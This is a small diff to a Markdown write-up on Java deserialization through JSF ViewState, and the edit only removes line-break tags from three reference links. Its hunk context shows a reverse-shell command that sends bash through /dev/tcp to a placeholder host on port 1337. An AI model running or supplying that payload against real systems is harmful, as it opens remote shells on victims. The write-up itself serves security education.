@@ -247,6 +247,6 @@ Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
 * Never trust the data contained in a ViewState. Consider they have been potentially tampered by a user. So, you must check them carefully to prevent the attacks previously described.
 
 **Reference :**
-<p><a href="https://www.exploit-db.com/docs/48126">Java Deserialization in ViewState</a>     <br />
-<p><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a>     <br />
-<p><a href="https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf">JSF ViewState upside-down</a>     <br />
+<p><a href="https://www.exploit-db.com/docs/48126">Java Deserialization in ViewState</a>
+<p><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a>
+<p><a href="https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf">JSF ViewState upside-down</a>
